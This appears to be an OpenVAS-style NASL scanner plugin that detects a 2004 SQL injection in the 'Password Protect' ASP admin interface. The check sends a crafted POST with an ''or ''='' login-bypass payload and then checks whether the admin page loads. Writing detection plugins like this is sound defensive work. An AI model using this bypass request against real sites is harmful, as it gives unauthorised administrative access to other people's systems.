# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# Contact: Criolabs <security@criolabs.net>
# Subject: Password Protect XSS and SQL-Injection vulnerabilities.
# Date:     31.8.2004 02:17

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14587");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1647", "CVE-2004-1648");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11073");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Password Protect SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");

  script_tag(name:"summary", value:"Password Protect is a password protected script allowing you to manage a
  remote site through an ASP based interface.");

  script_tag(name:"impact", value:"An SQL Injection vulnerability in the product allows remote attackers to
  inject arbitrary SQL statements into the remote database and to gain
  administrative access on this service.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_asp( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/adminSection/main.asp";
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  v = eregmatch( pattern: "Set-Cookie: *([^; \t\r\n]+)", string:res );
  if( isnull( v ) ) continue; # Cookie is not available
  cookie = v[1];

  useragent = http_get_user_agent();
  req = string( "POST /", dir, "/adminSection/index_next.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 57\r\n",
                "\r\n",
                "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  req = string( "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "Web Site Administration" >< res && "The Web Animations Administration Section" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
